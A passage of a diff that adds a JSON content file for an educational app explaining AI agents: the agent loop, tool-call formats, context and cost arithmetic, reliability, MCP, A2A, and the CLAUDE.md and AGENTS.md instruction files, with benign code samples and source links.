@@ -1,0 +1,1429 @@
+{
+ "intro": "How an agent actually runs: the loop, what goes into each model call, the protocols that connect it to tools and other agents, the files that configure it, and the arithmetic of cost and reliability. Code is real and current; every fact links to its source.",
+ "groups": [
+  {
+   "id": "loop",
+   "name": "The loop"
+  },
+  {
+   "id": "protocols",
+   "name": "Connecting tools and agents"
+  },
+  {
+   "id": "files",
+   "name": "Instruction and configuration files"
+  },
+  {
+   "id": "operate",
+   "name": "Memory, safety and practice"
+  }
+ ],
+ "topics": [
+  {
+   "id": "loop",
+   "group": "loop",
+   "name": "The agent loop",
+   "short": "Call the model, run the tools it asks for, repeat until it stops.",
+   "plain": "Picture an analyst who cannot leave their desk. They decide what to look up, pass a request slip to a clerk, read the reply, and decide again. The clerk does every action and can refuse a slip. In an agent, the model is the analyst and your code is the clerk.",
+   "technical": [
+    "The model cannot act. Each call returns text, or a structured request to call a named tool with JSON arguments.",
+    "Your code, the harness, runs the requested tool, adds the result to the conversation and calls the model again with the whole conversation.",
+    "The loop ends when the model replies without a tool request (stop reason end_turn on the Claude API), or when the harness stops it: a step limit, a token or cost budget, a timeout, or a person.",
+    "Model APIs are stateless: each call resends the full history, so the conversation is the agent's working state.",
+    "On any turn the model knows only what is in that request: system prompt, tool definitions, loaded instruction files, history and tool results.",
+    "In a workflow, code fixes the order of calls. In an agent, the model chooses the next step. That choice is the whole difference."
+   ],
+   "matters": "The loop is where cost, latency, risk and audit live. Each turn is a billable model call and each tool call is an action the organisation answers for. Limits on turns, tokens and tools are set in the harness, not in the prompt, and the harness log is the audit trail.",
+   "code": [
+    {
+     "lang": "python",
+     "title": "A manual loop on the Claude API (Anthropic Python SDK)",
+     "text": "import anthropic\n\nclient = anthropic.Anthropic()\ntools = [...]  # Your tool definitions\nmessages = [{\"role\": \"user\", \"content\": user_input}]\n\n# Agentic loop: keep going until Claude stops calling tools\nwhile True:\n    response = client.messages.create(\n        model=\"claude-opus-5-5\",\n        max_tokens=16000,\n        tools=tools,\n        messages=messages\n    )\n\n    # If Claude is done (no more tool calls), break\n    if response.stop_reason == \"end_turn\":\n        break\n\n    # Server-side tool hit iteration limit; append the paused turn and re-send to continue\n    if response.stop_reason == \"pause_turn\":\n        messages.append({\"role\": \"assistant\", \"content\": response.content})\n        continue\n\n    # Extract tool use blocks from the response\n    tool_use_blocks = [b for b in response.content if b.type == \"tool_use\"]\n\n    # Append assistant's response (including tool_use blocks)\n    messages.append({\"role\": \"assistant\", \"content\": response.content})\n\n    # Execute each tool and collect results\n    tool_results = []\n    for tool in tool_use_blocks:\n        result = execute_tool(tool.name, tool.input)  # Your implementation\n        tool_results.append({\n            \"type\": \"tool_result\",\n            \"tool_use_id\": tool.id,  # Must match the tool_use block's id\n            \"content\": result\n        })\n\n    # Append tool results as a user message\n    messages.append({\"role\": \"user\", \"content\": tool_results})\n\n# Final response text\nfinal_text = next(b.text for b in response.content if b.type == \"text\")",
+     "note": "From the Anthropic SDK documentation. The SDK also offers a tool runner that writes this loop for you."
+    },
+    {
+     "lang": "python",
+     "title": "The same loop, independent of vendor",
+     "text": "history = [request]\nfor step in range(MAX_STEPS):                  # the harness owns the budget\n    reply = model(system, tools, history)       # the whole history, every time\n    history.append(reply)\n    calls = tool_requests(reply)\n    if not calls:\n        return reply                            # the model chose to stop\n    results = [run(call) for call in calls]     # permissions, approval, timeouts\n    history.append(results)                     # results go back as input\nraise StepLimitReached                          # the harness chose to stop",
+     "note": "Sketch. model(), tool_requests() and run() stand for your provider call, the parsing of its tool requests and your tool dispatcher."
+    }
+   ],
+   "math": [
+    {
+     "label": "Trajectory",
+     "tex": "\\tau = (x,\\; a_1, o_1,\\; a_2, o_2,\\; \\dots,\\; a_T)",
+     "note": "x is the request, a_t the model output at step t (text or tool calls) and o_t the tool results returned to it."
+    },
+    {
+     "label": "Policy",
+     "tex": "a_t \\sim \\pi_\\theta(\\,\\cdot \\mid c_t), \\qquad c_t = (s,\\, \\mathcal{T},\\, x,\\, a_1, o_1, \\dots, a_{t-1}, o_{t-1})",
+     "note": "The model is a policy over the context c_t: system prompt s, tool definitions T and the history so far. Nothing outside c_t influences the step."
+    },
+    {
+     "label": "Stopping",
+     "tex": "T = \\min\\big(\\min\\{t : a_t \\text{ requests no tool}\\},\\; T_{\\max}\\big)",
+     "note": "The run ends at the first step without a tool request, or at the harness limit T_max, whichever comes first."
+    }
+   ],
+   "demo": "loop",
+   "related": [
+    {
+     "label": "ReAct in the lab",
+     "href": "#/agents/lab/react"
+    },
+    {
+     "label": "Workflows and agents",
+     "href": "#/agents/overview"
+    }
+   ],
+   "sources": [
+    {
+     "title": "Claude documentation: tool use",
+     "url": "https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview"
+    },
+    {
+     "title": "Anthropic: Building effective agents (19 Dec 2024)",
+     "url": "https://www.anthropic.com/engineering/building-effective-agents"
+    },
+    {
+     "title": "ReAct: Synergizing Reasoning and Acting in Language Models, Yao et al., 2022 (arXiv 2210.03629)",
+     "url": "https://arxiv.org/abs/2210.03629"
+    }
+   ]
+  },
+  {
+   "id": "toolcall",
+   "group": "loop",
+   "name": "Tool calls on the wire",
+   "short": "A tool is a name, a description and a JSON Schema. The model fills in the arguments.",
+   "plain": "A tool definition is a form the model can fill in. The description says when the form applies and the schema says which boxes exist and what may go in them. Your code checks the completed form before acting on it.",
+   "technical": [
+    "Each tool is declared with a name, a description and an input schema in JSON Schema. The definitions travel with every request and count as input tokens.",
+    "When the model wants a tool, its reply holds a tool_use block with an id, the tool name and the arguments, and the stop reason is tool_use on the Claude API.",
+    "The harness runs the tool and returns a tool_result block quoting the same id. A failed call goes back with is_error set, so the model can correct itself instead of guessing.",
+    "One reply may hold several tool_use blocks (parallel tool use). All their results go back together in the next message.",
+    "Strict mode (strict: true on the Claude API) makes the arguments match the schema exactly. Without it, the harness must validate them.",
+    "The description is the main lever on choosing the right tool: say what it does, when to use it and what it returns."
+   ],
+   "matters": "Tool definitions are the agent's permission surface: an undeclared tool cannot be called. Narrow, well-described tools with validated inputs are easier to secure and test than one general tool such as an unrestricted shell.",
+   "code": [
+    {
+     "lang": "json",
+     "title": "A tool definition (Claude API format), from the lab's memory_estimate tool",
+     "text": "{\n  \"name\": \"memory_estimate\",\n  \"description\": \"GPU memory for weights plus attention cache at a context length and number of sessions, plus headroom.\",\n  \"input_schema\": {\n    \"type\": \"object\",\n    \"properties\": {\n      \"id\": {\n        \"type\": \"string\",\n        \"description\": \"Catalog model id\"\n      },\n      \"contextTokens\": {\n        \"type\": \"integer\",\n        \"minimum\": 1,\n        \"description\": \"Tokens held per session\"\n      },\n      \"sessions\": {\n        \"type\": \"integer\",\n        \"minimum\": 1,\n        \"maximum\": 1024,\n        \"description\": \"Concurrent sessions\"\n      },\n      \"headroomPct\": {\n        \"type\": \"number\",\n        \"minimum\": 0,\n        \"maximum\": 100,\n        \"description\": \"Extra memory kept free, in percent\"\n      }\n    },\n    \"required\": [\n      \"id\",\n      \"contextTokens\",\n      \"sessions\"\n    ],\n    \"additionalProperties\": false\n  }\n}"
+    },
+    {
+     "lang": "json",
+     "title": "What the model returns (stop_reason: tool_use)",
+     "text": "{\n  \"role\": \"assistant\",\n  \"content\": [\n    {\n      \"type\": \"text\",\n      \"text\": \"I will size the top candidate for four 32K sessions.\"\n    },\n    {\n      \"type\": \"tool_use\",\n      \"id\": \"toolu_01\",\n      \"name\": \"memory_estimate\",\n      \"input\": {\n        \"id\": \"qwen3-30b-a3b\",\n        \"contextTokens\": 32768,\n        \"sessions\": 4,\n        \"headroomPct\": 10\n      }\n    }\n  ]\n}",
+     "note": "Ids are shortened for reading; the API issues longer ones."
+    },
+    {
+     "lang": "json",
+     "title": "What your code sends back",
+     "text": "{\n  \"role\": \"user\",\n  \"content\": [\n    {\n      \"type\": \"tool_result\",\n      \"tool_use_id\": \"toolu_01\",\n      \"content\": \"<the tool's output as text>\"\n    }\n  ]\n}"
+    }
+   ],
+   "math": [
+    {
+     "label": "Definition overhead",
+     "tex": "\\text{overhead} = T \\times \\sum_{i=1}^{K} |d_i|",
+     "note": "K tool definitions of |d_i| tokens each, resent on every one of T turns unless the prefix is cached."
+    }
+   ],
+   "related": [
+    {
+     "label": "Tool calling in the lab",
+     "href": "#/agents/lab/tools"
+    }
+   ],
+   "sources": [
+    {
+     "title": "Claude documentation: tool use",
+     "url": "https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview"
+    },
+    {
+     "title": "OpenAI documentation: function calling",
+     "url": "https://developers.openai.com/api/docs/guides/function-calling"
+    },
+    {
+     "title": "Toolformer: Language Models Can Teach Themselves to Use Tools, Schick et al., 2023 (arXiv 2302.04761)",
+     "url": "https://arxiv.org/abs/2302.04761"
+    }
+   ]
+  },
+  {
+   "id": "context",
+   "group": "loop",
+   "name": "Context: the agent's working memory",
+   "short": "Everything the model knows on a turn has to fit in one window.",
+   "plain": "The context window is the desk. Whatever is on it can be used; whatever is in the filing cabinet has to be fetched first. A cluttered desk slows the work and things get missed.",
+   "technical": [
+    "A request's context holds the system prompt, tool definitions, instruction files (CLAUDE.md, AGENTS.md), skill descriptions, the conversation so far and every tool result.",
+    "Tool results usually dominate long runs. A file listing, a web page or a query result can each be thousands of tokens, and stays in context until it is removed.",
+    "Recall degrades as context grows. Liu et al. found models use information at the start and end of a long input better than in the middle; Anthropic calls the general effect context rot.",
+    "Compaction summarises the history near the limit and continues in a fresh window from the summary.",
+    "Just-in-time retrieval keeps references (paths, queries, links) in context and loads the content through tools only when it is needed.",
+    "Notes written to files outside the window, and sub-agents with their own clean windows, keep long tasks within budget."
+   ],
+   "matters": "In long-running agents, context drives both cost and quality. What enters the context, and what gets dropped or summarised, is an engineering decision that needs an owner, not a side effect.",
+   "code": [],
+   "math": [
+    {
+     "label": "Context on turn t",
+     "tex": "c_t = |s| + \\sum_{i=1}^{K}|d_i| + |m| + \\sum_{j<t}\\big(|a_j| + |o_j|\\big)",
+     "note": "s is the system prompt, d_i the tool definitions, m the loaded instruction files and skill descriptions, a_j and o_j earlier model outputs and tool results, all in tokens."
+    },
+    {
+     "label": "Compaction",
+     "tex": "c_t \\ge \\rho\\,W \\;\\Rightarrow\\; c_{t+1} = |s| + \\sum_i |d_i| + |m| + |\\text{summary}|",
+     "note": "W is the window and rho the fraction at which the harness compacts."
+    }
+   ],
+   "demo": "budget",
+   "related": [
+    {
+     "label": "Retrieval (RAG)",
+     "href": "#/rag"
+    }
+   ],
+   "sources": [
+    {
+     "title": "Anthropic: Effective context engineering for AI agents (29 Sep 2025)",
+     "url": "https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents"
+    },
+    {
+     "title": "Lost in the Middle: How Language Models Use Long Contexts, Liu et al., 2023 (arXiv 2307.03172)",
+     "url": "https://arxiv.org/abs/2307.03172"
+    }
+   ]
+  },
+  {
+   "id": "cost",
+   "group": "loop",
+   "name": "Cost and latency of a loop",
+   "short": "Each turn resends everything before it, so input grows with the square of the turns.",
+   "plain": "Every time the analyst calls the clerk, the whole case file is read out from page one. Ten calls means the first page is read ten times. A cache is a clerk who remembers what was already read and charges less to hear it again.",
+   "technical": [
+    "Each call resends the full history, so the input of turn t includes everything from turns 1 to t−1. Summed over a run, input tokens grow with the square of the number of turns.",
+    "Prompt caching stores a prefix that repeats exactly. On the Claude API a cache write costs 1.25 times the base input price (5-minute lifetime) and a read 0.1 times by default; some newer models price reads at 0.05 or 0.025 times.",
+    "The cached prefix is built in a fixed order: tools, then system prompt, then messages. Changing an early byte, such as a timestamp in the system prompt or a reordered tool list, invalidates everything after it.",
+    "Output tokens cost more than input tokens and are produced one after another, so long reasoning and long answers dominate latency.",
+    "A sequential loop takes roughly the model time plus the tool time of each turn. Running tools in parallel and taking fewer turns are the main levers."
+   ],
+   "matters": "Agent cost is per completed task, not per call. A pattern that needs fewer turns, keeps a stable cached prefix and keeps tool results short can cost a fraction of a naive loop for the same answer.",
+   "code": [],
+   "math": [
+    {
+     "label": "Input without caching",
+     "tex": "I = \\sum_{t=1}^{T}\\big(P + t\\,\\Delta\\big) = T\\,P + \\Delta\\,\\frac{T(T+1)}{2}",
+     "note": "P is the fixed prefix (system prompt, tools, instruction files) and Delta the tokens each turn adds (model output plus tool results)."
+    },
+    {
+     "label": "Input with caching",
+     "tex": "I_{\\text{eff}} = \\sum_{t=1}^{T}\\Big(w\\,n_t + r\\,\\big(P + t\\,\\Delta - n_t\\big)\\Big)",
+     "note": "n_t is the new tokens at turn t (P plus Delta on the first turn, Delta after), w the write multiplier and r the read multiplier."
+    },
+    {
+     "label": "Sequential latency",
+     "tex": "L \\approx \\sum_{t=1}^{T}\\Big(\\ell_{\\text{model}}(t) + \\max_{k \\in \\text{calls}(t)} \\ell_k\\Big)",
+     "note": "Tools called in parallel within a turn cost the slowest of them, not the sum."
+    }
+   ],
+   "demo": "cost",
+   "related": [
+    {
+     "label": "Cost and latency of every pattern",
+     "href": "#/agents/cost"
+    }
+   ],
+   "sources": [
+    {
+     "title": "Claude documentation: prompt caching",
+     "url": "https://platform.claude.com/docs/en/build-with-claude/prompt-caching"
+    },
+    {
+     "title": "Anthropic: How we built our multi-agent research system (13 Jun 2025)",
+     "url": "https://www.anthropic.com/engineering/multi-agent-research-system"
+    }
+   ]
+  },
+  {
+   "id": "reliability",
+   "group": "loop",
+   "name": "Reliability over many steps",
+   "short": "Small error rates compound. Measure consistency, not the best run.",
+   "plain": "Think of a relay team where each runner drops the baton once in twenty handovers. They finish most short races and few long ones. An agent is a relay race.",
+   "technical": [
+    "If each step succeeds independently with probability p, a task of n steps succeeds with probability pⁿ. At p = 0.95, ten steps succeed about 60% of the time.",
+    "A check that detects a failed step and retries it raises the effective step success rate. A check that misses errors does not.",
+    "pass@k asks whether at least one of k attempts succeeds. That suits work where a person or a test picks the good attempt.",
+    "pass^k, introduced with τ-bench, asks whether all k attempts succeed. That suits an agent serving customers, where every run must be right. The τ-bench authors report pass^8 below 25% in the retail domain for leading function-calling agents such as gpt-4o.",
+    "Success rates differ between tasks, so a benchmark's pass^k is the average of each task's rate to the power k. By Jensen's inequality that is at least the average rate to the power k. Report it per task family."
+   ],
+   "matters": "A demo shows one good run; production needs every run to be good. Ask teams and vendors for pass^k on representative tasks, and give steps that must not fail a shorter path with checks.",
+   "code": [],
+   "math": [
+    {
+     "label": "Task success",
+     "tex": "P(\\text{task}) = \\prod_{i=1}^{n} p_i = p^{\\,n}",
+     "note": "Steps independent, each with success rate p."
+    },
+    {
+     "label": "With detection and retry",
+     "tex": "p' = 1 - (1-p)^{\\,r+1}",
+     "note": "Each step is checked and retried up to r times; assumes the check catches every failure."
+    },
+    {
+     "label": "pass@k and pass^k",
+     "tex": "\\text{pass@}k = 1-(1-p)^{k}, \\qquad \\text{pass}^{k} = p^{\\,k}",
+     "note": "For one task with success rate p and independent attempts."
+    },
+    {
+     "label": "Across tasks",
+     "tex": "\\overline{\\text{pass}^{k}} = \\frac{1}{N}\\sum_{j=1}^{N} p_j^{\\,k} \\;\\ge\\; \\bar p^{\\,k}",
+     "note": "Averaged over N tasks with success rates p_j; the inequality is Jensen's."
+    }
+   ],
+   "demo": "reliability",
+   "related": [
+    {
+     "label": "Benchmarks and controls",
+     "href": "#/agents/govern"
+    }
+   ],
+   "sources": [
+    {
+     "title": "τ-bench: A Benchmark for Tool-Agent-User Interaction in Real-World Domains, Yao et al., 2024 (arXiv 2406.12045)",
+     "url": "https://arxiv.org/abs/2406.12045"
+    }
+   ]
+  },
+  {
+   "id": "mcp",
+   "group": "protocols",
+   "name": "Model Context Protocol (MCP)",
+   "short": "One open protocol for connecting agents to tools and data.",
+   "plain": "MCP does for agent tools what a standard socket does for appliances: build the plug once and it fits every compliant building. A tool vendor writes one MCP server and every host that speaks MCP can use it.",
+   "technical": [
+    "Roles: a host is the AI application (an IDE, a chat app, an agent). It runs one client for each server it connects to, and a server exposes capabilities. Messages are JSON-RPC 2.0.",
+    "Servers offer tools (functions the model may call), resources (data the model or user can read) and prompts (templates users invoke). Clients offer elicitation, which lets a server ask the user for input. Revision 2026-07-28 deprecates sampling, roots and logging.",
+    "Since revision 2026-07-28 the protocol is stateless. There is no initialize handshake: every request carries its protocol version and client capabilities in _meta, and servers implement server/discover to advertise theirs.",
+    "A host lists tools with tools/list and invokes one with tools/call. A result has resultType complete, or input_required when the server needs more information, in which case the client retries the request with the answers (multi round-trip requests).",
+    "Transports are stdio, where the host starts the server as a local process, and Streamable HTTP for remote servers. HTTP servers follow the specification's OAuth-based authorization; stdio servers take credentials from the environment.",
+    "Errors the model can fix come back as results with isError: true. Malformed requests come back as JSON-RPC errors.",
+    "Anthropic contributed MCP to the Agentic AI Foundation, formed under the Linux Foundation on 9 December 2025."
+   ],
+   "matters": "MCP turns each integration into a reusable, reviewable asset: one approved server can serve every agent in the organisation, with one place to apply authorization, logging and allow-lists. The specification says hosts must obtain user consent before invoking any tool and must treat tool descriptions as untrusted unless the server is trusted.",
+   "code": [
+    {
+     "lang": "python",
+     "title": "A minimal MCP server (MCP Python SDK)",
+     "text": "from mcp.server import MCPServer\n\nmcp = MCPServer(\"model-catalog\")\n\n@mcp.tool()\nasync def memory_estimate(weights_gib: float, kv_kib_per_token: float,\n                          context_tokens: int, sessions: int) -> str:\n    \"\"\"Estimate GPU memory for serving a model.\n\n    Args:\n        weights_gib: Weight memory in GiB at the chosen precision\n        kv_kib_per_token: Attention cache per token in KiB\n        context_tokens: Tokens held per session\n        sessions: Concurrent sessions\n    \"\"\"\n    cache_gib = kv_kib_per_token * context_tokens * sessions / 1024**2\n    return f\"{weights_gib + cache_gib:.1f} GiB, of which {cache_gib:.1f} GiB is cache\"\n\nif __name__ == \"__main__\":\n    mcp.run(transport=\"stdio\")",
+     "note": "Structure from the official server quickstart. The SDK builds the tool's input schema from the type hints and docstring."
+    },
+    {
+     "lang": "json",
+     "title": "Calling the tool (revision 2026-07-28)",
+     "text": "{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"tools/call\",\n  \"params\": {\n    \"name\": \"memory_estimate\",\n    \"arguments\": {\n      \"weights_gib\": 57,\n      \"kv_kib_per_token\": 96,\n      \"context_tokens\": 32768,\n      \"sessions\": 4\n    },\n    \"_meta\": {\n      \"io.modelcontextprotocol/protocolVersion\": \"2026-07-28\",\n      \"io.modelcontextprotocol/clientInfo\": {\n        \"name\": \"ExampleClient\",\n        \"version\": \"1.0.0\"\n      },\n      \"io.modelcontextprotocol/clientCapabilities\": {}\n    }\n  }\n}"
+    },
+    {
+     "lang": "json",
+     "title": "The result",
+     "text": "{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"resultType\": \"complete\",\n    \"content\": [\n      {\n        \"type\": \"text\",\n        \"text\": \"69.0 GiB, of which 12.0 GiB is cache\"\n      }\n    ],\n    \"isError\": false\n  }\n}"
+    },
+    {
+     "lang": "json",
+     "title": "Registering a local server with a host (Claude Desktop, claude_desktop_config.json)",
+     "text": "{\n  \"mcpServers\": {\n    \"model-catalog\": {\n      \"command\": \"uv\",\n      \"args\": [\n        \"--directory\",\n        \"/ABSOLUTE/PATH/TO/model-catalog\",\n        \"run\",\n        \"server.py\"\n      ]\n    }\n  }\n}"
+    }
+   ],
+   "math": [
+    {
+     "label": "Integrations without a shared protocol",
+     "tex": "N = H \\times S",
+     "note": "H hosts each build a connector to each of S tools."
+    },
+    {
+     "label": "With a shared protocol",
+     "tex": "N = H + S",
+     "note": "Each host implements the client once and each tool implements the server once."
+    }
+   ],
+   "demo": "mcp",
+   "sources": [
+    {
+     "title": "Model Context Protocol specification, revision 2026-07-28",
+     "url": "https://modelcontextprotocol.io/specification/2026-07-28"
+    },
+    {
+     "title": "MCP specification 2026-07-28: base protocol",
+     "url": "https://modelcontextprotocol.io/specification/2026-07-28/basic"
+    },
+    {
+     "title": "MCP specification 2026-07-28: key changes",
+     "url": "https://modelcontextprotocol.io/specification/2026-07-28/changelog"
+    },
+    {
+     "title": "MCP specification 2026-07-28: tools",
+     "url": "https://modelcontextprotocol.io/specification/2026-07-28/server/tools"
+    },
+    {
+     "title": "MCP documentation: build an MCP server",
+     "url": "https://modelcontextprotocol.io/docs/develop/build-server"
+    },
+    {
+     "title": "Linux Foundation: formation of the Agentic AI Foundation (9 Dec 2025)",
+     "url": "https://www.linuxfoundation.org/press/linux-foundation-announces-the-formation-of-the-agentic-ai-foundation"
+    }
+   ]
+  },
+  {
+   "id": "a2a",
+   "group": "protocols",
+   "name": "Agent2Agent protocol (A2A)",
+   "short": "How one agent hands work to another, across teams and vendors.",
+   "plain": "If MCP is how an agent uses a tool, A2A is how one agent engages another. It reads the other agent's published card, hands over a task and follows it until the work product comes back.",
+   "technical": [
+    "An A2A server publishes an Agent Card: JSON metadata describing its identity, capabilities, skills, service endpoint and authentication requirements, served at /.well-known/agent-card.json.",
+    "A Task is the unit of work. It has a unique id and a state: submitted, working, input required, auth required, completed, failed, canceled or rejected.",
+    "Agents exchange Messages made of Parts, the smallest unit of content. What a task produces comes back as Artifacts: documents, images or structured data.",
+    "The specification defines JSON-RPC, gRPC and HTTP+JSON/REST bindings. The latest released version is 1.0.0.",
+    "The remote agent is opaque. The caller sees the card, the task state and the artifacts, not the remote agent's tools, prompts or memory.",
+    "A2A has joined the Agentic AI Foundation. The specification is published under the Linux Foundation with an Apache 2.0 licence."
+   ],
+   "matters": "A2A is where one organisation's agent meets another's. Treat the remote agent as a supplier: authenticate it, decide what it may be given, and keep the task id and artifacts as the record of what was delegated.",
+   "code": [],
+   "table": {
+    "columns": [
+     "Object",
+     "What it is"
+    ],
+    "rows": [
+     [
+      "Agent Card",
+      "Published metadata: identity, capabilities, skills, endpoint, authentication requirements."
+     ],
+     [
+      "Task",
+      "A unit of work with an id and a lifecycle state."
+     ],
+     [
+      "Message",
+      "One turn between client and remote agent, with a role and one or more Parts."
+     ],
+     [
+      "Part",
+      "The smallest unit of content in a Message or Artifact."
+     ],
+     [
+      "Artifact",
+      "An output the task produced: a document, an image or structured data."
+     ]
+    ]
+   },
+   "math": [],
+   "sources": [
+    {
+     "title": "A2A protocol specification (latest released version 1.0.0)",
+     "url": "https://a2a-protocol.org/latest/specification/"
+    }
+   ]
+  },
+  {
+   "id": "protocols",
+   "group": "protocols",
+   "name": "Function calling, MCP and A2A compared",
+   "short": "Three layers, not three rivals.",
+   "plain": "An agent uses function calling to talk to its model, MCP to reach tools and data, and A2A to hand work to other agents. Most production systems use the first two, and some use all three.",
+   "technical": [
+    "Function calling is part of each model vendor's API. It defines how the model asks for a tool, not where the tool lives.",
+    "MCP standardises the connection between an AI application and a tool server, so a tool is built once and reused by many hosts.",
+    "A2A standardises delegation between agents that do not share code, memory or tools."
+   ],
+   "matters": "Choose the layer by who owns the capability. Tools inside your application need only function calling. Tools shared across agents and teams belong behind MCP. Work done by another team's or vendor's agent goes over A2A, under a supplier-style agreement.",
+   "code": [],
+   "table": {
+    "columns": [
+     "",
+     "Function calling",
+     "MCP",
+     "A2A"
+    ],
+    "rows": [
+     [
+      "Connects",
+      "A model to code in your application",
+      "An AI application to tools, data and prompts",
+      "One agent to another agent"
+     ],
+     [
+      "Defined by",
+      "Each model vendor's API",
+      "Open specification, Agentic AI Foundation",
+      "Open specification, Agentic AI Foundation"
+     ],
+     [
+      "Discovery",
+      "Tool definitions sent with each request",
+      "tools/list, resources/list, prompts/list and server/discover",
+      "Agent Card at /.well-known/agent-card.json"
+     ],
+     [
+      "Unit of work",
+      "One tool call and its result",
+      "One request and its result; long work through the tasks extension",
+      "A Task with states and Artifacts"
+     ],
+     [
+      "Wire format",
+      "The vendor's HTTPS API",
+      "JSON-RPC 2.0 over stdio or Streamable HTTP",
+      "JSON-RPC, gRPC or HTTP+JSON/REST"
+     ],
+     [
+      "What the caller sees",
+      "Everything: your code runs the tool",
+      "Tool inputs and results",
+      "The card, task state and artifacts only"
+     ],
+     [
+      "Use when",
+      "The tool lives in your application",
+      "The tool should serve many agents and hosts",
+      "Another team or vendor runs the agent doing the work"
+     ]
+    ]
+   },
+   "math": [],
+   "sources": [
+    {
+     "title": "Claude documentation: tool use",
+     "url": "https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview"
+    },
+    {
+     "title": "Model Context Protocol specification, revision 2026-07-28",
+     "url": "https://modelcontextprotocol.io/specification/2026-07-28"
+    },
+    {
+     "title": "MCP specification 2026-07-28: key changes",
+     "url": "https://modelcontextprotocol.io/specification/2026-07-28/changelog"
+    },
+    {
+     "title": "A2A protocol specification (latest released version 1.0.0)",
+     "url": "https://a2a-protocol.org/latest/specification/"
+    }
+   ]
+  },
+  {
+   "id": "claudemd",
+   "group": "files",
+   "name": "CLAUDE.md",
+   "short": "Persistent project instructions for Claude Code, read at the start of every session.",
+   "plain": "CLAUDE.md is the induction pack on a new colleague's desk: how to build, how to test, the house rules. It is read every morning, but it is a briefing, not a lock on the door.",
+   "technical": [
+    "Locations: managed policy for the whole organisation (for example /etc/claude-code/CLAUDE.md on Linux), user (~/.claude/CLAUDE.md), project (./CLAUDE.md or ./.claude/CLAUDE.md, committed) and local (./CLAUDE.local.md, git-ignored).",
+    "At launch, Claude Code loads CLAUDE.md and CLAUDE.local.md from the working directory and every directory above it. They are concatenated, not overridden, from the filesystem root down, so the closest file is read last.",
+    "Files in subdirectories load on demand, once Claude reads or edits a file in that subdirectory.",
+    "@path imports pull in other files, resolved relative to the importing file, up to four hops deep. Imports organise a file but do not reduce its context cost.",
+    "Rules in .claude/rules/*.md can carry a paths field, so they load only when Claude works with matching files.",
+    "The content is delivered as a user message after the system prompt. Claude tries to follow it, but compliance is not guaranteed. The documentation recommends under 200 lines per file and specific instructions.",
+    "Enforcement belongs in settings (permissions.deny, sandboxing) and hooks. The documentation draws this line for managed deployments: settings for technical enforcement, CLAUDE.md for behavioural guidance.",
+    "/init drafts a CLAUDE.md from the codebase and /memory opens the loaded files. Auto memory, MEMORY.md written by Claude itself, loads its first 200 lines or 25KB."
+   ],
+   "matters": "Instruction files are the cheapest governance lever: versioned, reviewed in pull requests and shared by the whole team. They are also a supply-chain surface. A committed file steers every developer's agent, which is why Claude Code asks for approval before loading imports from outside the project.",
+   "code": [
+    {
+     "lang": "markdown",
+     "title": "An example CLAUDE.md, written for this application",
+     "text": "# Babel Fish\n\nStatic Vite + Svelte 5 + TypeScript app. All data and copy live in ./data.\n\n## Commands\n- npm run dev: development server\n- npm run check: svelte-check; must report 0 errors and 0 warnings\n- npm run build: production build\n\n## Rules\n- Never hard-code user-facing text; add a key to data/content/copy.json.\n- Cite a source for every factual claim in data/content/*.json.\n- Only models in the Raschka gallery belong in the main catalog.\n\n@README.md"
+    },
+    {
+     "lang": "text",
+     "title": "Where the files live",
+     "text": "/etc/claude-code/CLAUDE.md          managed policy (Linux), whole organisation\n~/.claude/CLAUDE.md                 you, every project\n~/.claude/rules/*.md                you, every project\nrepo/CLAUDE.md                      team, committed\nrepo/.claude/rules/*.md             team, optionally scoped with paths:\nrepo/CLAUDE.local.md                you, this project, git-ignored\nrepo/services/payments/CLAUDE.md    loaded when Claude works in that folder"
+    }
+   ],
+   "math": [],
+   "demo": "files",
+   "sources": [
+    {
+     "title": "Claude Code documentation: how Claude remembers your project",
+     "url": "https://code.claude.com/docs/en/memory"
+    }
+   ]
+  },
+  {
+   "id": "agentsmd",
+   "group": "files",
+   "name": "AGENTS.md",
+   "short": "An open, vendor-neutral README for coding agents.",
+   "plain": "AGENTS.md is the same induction pack, written so that any vendor's agent can read it.",
+   "technical": [
+    "AGENTS.md is plain Markdown with no required fields. Its site suggests a project overview, build and test commands, code style, testing instructions and security considerations.",
+    "In a monorepo each package can have its own AGENTS.md. Agents read the nearest file in the directory tree, and explicit chat instructions override it.",
+    "OpenAI released it in August 2025 and contributed it to the Agentic AI Foundation under the Linux Foundation. Tools that read it include OpenAI Codex, Google Jules, Cursor, Gemini CLI, GitHub Copilot's coding agent, Aider, goose, Zed, Warp, VS Code and Devin.",
+    "Codex reads a global file from ~/.codex (AGENTS.override.md if present, otherwise AGENTS.md). It then walks from the project root to the working directory, taking at most one file per directory and preferring AGENTS.override.md. Files are joined root first, so deeper files take precedence, up to 32 KiB by default.",
+    "Claude Code reads AGENTS.md when there is no CLAUDE.md or CLAUDE.local.md in the working directory or above it (version 2.1.277 and later; configurable). A CLAUDE.md can also import it with @AGENTS.md.",
+    "GitHub Copilot reads AGENTS.md files anywhere in the repository, with the nearest taking precedence, or a single CLAUDE.md or GEMINI.md at the root instead."
+   ],
+   "matters": "One instruction file for every agent avoids drift between vendor-specific copies. Where several tools are in use, standardise on AGENTS.md and keep vendor files as thin imports of it.",
+   "code": [
+    {
+     "lang": "markdown",
+     "title": "An example AGENTS.md",
+     "text": "# AGENTS.md\n\n## Project overview\nStatic Vite + Svelte 5 + TypeScript app. Data and copy live in ./data.\n\n## Build and test\n- npm run check (must be clean)\n- npm run test:data\n- npm run build\n\n## Code style\n- TypeScript strict; no user-facing strings in components.\n\n## Security\n- Never commit .env or credentials. Do not add network calls at runtime."
+    },
+    {
+     "lang": "markdown",
+     "title": "A CLAUDE.md that reuses it",
+     "text": "@AGENTS.md\n\n## Claude Code only\n- Prefer the Edit tool over shell sed for multi-line changes."
+    }
+   ],
+   "math": [],
+   "demo": "files",
+   "sources": [
+    {
+     "title": "agents.md",
+     "url": "https://agents.md/"
+    },
+    {
+     "title": "Linux Foundation: formation of the Agentic AI Foundation (9 Dec 2025)",
+     "url": "https://www.linuxfoundation.org/press/linux-foundation-announces-the-formation-of-the-agentic-ai-foundation"
+    },
+    {
+     "title": "Codex documentation: AGENTS.md",
+     "url": "https://learn.chatgpt.com/docs/agent-configuration/agents-md"
+    },
+    {
